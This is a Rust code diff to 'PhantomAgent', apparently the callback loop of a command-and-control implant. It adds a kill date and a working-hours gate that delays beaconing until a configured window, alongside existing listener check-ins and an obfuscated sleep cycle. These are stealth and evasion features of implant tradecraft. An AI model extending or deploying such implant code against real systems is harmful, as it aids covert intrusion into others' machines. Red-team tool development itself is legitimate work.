@@ -13,6 +13,13 @@ use crate::error::PhantomError;
 impl PhantomAgent {
     /// Run the main callback loop until exit conditions are met.
     pub async fn run(&mut self) -> Result<(), PhantomError> {
+        if self.kill_date_elapsed() {
+            warn!("phantom kill date already reached at startup; exiting");
+            return Ok(());
+        }
+
+        self.wait_for_working_hours().await;
+
         if self.config.listener_pub_key.is_some() {
             self.ecdh_init_handshake().await?;
         } else {
@@ -29,9 +36,6 @@ impl PhantomAgent {
 
             let delay = Duration::from_millis(self.compute_sleep_delay());
             let mode = self.config.sleep_mode;
-            // `spawn_blocking` offloads the mprotect+nanosleep cycle to a
-            // dedicated OS thread so the Tokio executor remains schedulable.
-            // It works on both multi-thread and current-thread runtimes.
             let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
             if self.checkin().await? {
                 break;
@@ -39,6 +43,23 @@ impl PhantomAgent {
         }
 
         Ok(())
+    }
+
+    /// Block until the current time falls within the configured working-hours
+    /// window (config or dynamic state).  Returns immediately when no working
+    /// hours are configured.
+    async fn wait_for_working_hours(&self) {
+        let wh = self.state.working_hours().or(self.config.working_hours);
+        let Some(wh) = wh else { return };
+        let now = current_local_time();
+        if is_within_working_hours_at(wh, now) {
+            return;
+        }
+        let delay_ms = sleep_until_working_hours(wh, now);
+        info!(delay_ms, "outside working hours; sleeping until window opens");
+        let delay = Duration::from_millis(delay_ms);
+        let mode = self.config.sleep_mode;
+        let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
     }
 
     pub(super) fn compute_sleep_delay(&self) -> u64 {
